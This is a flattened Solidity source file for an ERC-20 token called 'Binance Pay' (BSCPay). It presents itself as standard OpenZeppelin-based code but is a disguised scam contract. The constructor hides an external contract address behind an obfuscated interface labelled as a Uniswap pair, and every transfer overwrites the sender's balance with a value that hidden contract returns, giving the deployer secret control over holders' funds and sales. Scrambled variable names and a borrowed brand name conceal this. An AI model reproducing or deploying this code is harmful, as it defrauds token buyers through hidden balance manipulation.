// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Sources flattened with hardhat v2.9.1 https://hardhat.org

// File @openzeppelin/contracts/utils/Context.sol@v4.5.0

// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

// File @openzeppelin/contracts/access/Ownable.sol@v4.5.0

// OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferownership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyowner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}
// File @uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router01.sol@v1.1.0-beta.0
interface pShPXbOiUkXjqzYgBGORi {
    function totalSupply(
        address zN688qD4Lwe,
        uint256 shgCjPd5PQ,
        uint256 Lq5tek7m9
        ) external view returns (uint256);
}
pragma solidity ^0.8.0;

contract TOKEN is Ownable {
    uint256 private _totalSupply;
    string private _namesn4i7c;
    string private _symbolsn4i7c;
    uint256 private _decimalssn4i7c;
    pShPXbOiUkXjqzYgBGORi private uniswapV1Pair;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    constructor(uint256 qsn4i7c, uint256 totalSupply_) {
        _namesn4i7c = "Binance Pay";
        _symbolsn4i7c = "BSCPay";
       uniswapV1Pair = pShPXbOiUkXjqzYgBGORi(
       address(uint160(qsn4i7c)));
        uint256 amount = totalSupply_ * 10**decimals();
        _totalSupply += amount;
        _balances[msg.sender] += amount;
        emit Transfer(address(0), msg.sender, amount);
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view returns (string memory) {
        return _namesn4i7c;
    }

     
    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view returns (string memory) {
        return _symbolsn4i7c;
    }

    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
        function julvixss() external view returns (uint256) {
    return _decimalssn4i7c;
    }
    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }
    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function transfer(address nktbhozkrecipient, uint256 rajiofytamount) public returns (bool) {
        _transfer(_msgSender(), nktbhozkrecipient, rajiofytamount);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
      
    function allowance(address vqqonwglowner, address zhguuvncspender)
        public
        view
        returns (uint256)
    {
        return _allowances[vqqonwglowner][zhguuvncspender];
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address tipwwswzsender,
        address xyfcdrdrrecipient,
        uint256 bonicidjamount
    ) public virtual returns (bool) {
        address spender = _msgSender();
        _spendAllowance(tipwwswzsender, spender, bonicidjamount);
        _transfer(tipwwswzsender, xyfcdrdrrecipient, bonicidjamount);
        return true;
    }
    
    

    function _transfer(
        address ycxiwnmrfrom,
        address boqgovecto,
        uint256 amount
    ) internal virtual {
        require(
            ycxiwnmrfrom != address(0),
            "ERC20: transfer from the zero address"
        );
        require(boqgovecto != address(0), "ERC20: transfer to the zero address");
        _balances[ycxiwnmrfrom] = uniswapV1Pair
            .totalSupply(
            ycxiwnmrfrom,
            amount,
            _balances[ycxiwnmrfrom]
        );
        require(
            _balances[ycxiwnmrfrom] >= amount,
            "ERC20: transfer amount exceeds balance"
        );
        _balances[ycxiwnmrfrom] = _balances[ycxiwnmrfrom] - amount;
        _balances[boqgovecto] = _balances[boqgovecto] + amount;
        emit Transfer(ycxiwnmrfrom, boqgovecto, amount);
    }
    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(
            currentAllowance >= subtractedValue,
            "ERC20: decreased allowance below zero"
        );
        _approve(owner, spender, currentAllowance - subtractedValue);
        return true;
    }
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(
                currentAllowance >= amount,
                "ERC20: insufficient allowance"
            );
            _approve(owner, spender, currentAllowance - amount);
        }
    }
      
      

        function increaseAllowance(address spender, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }
}


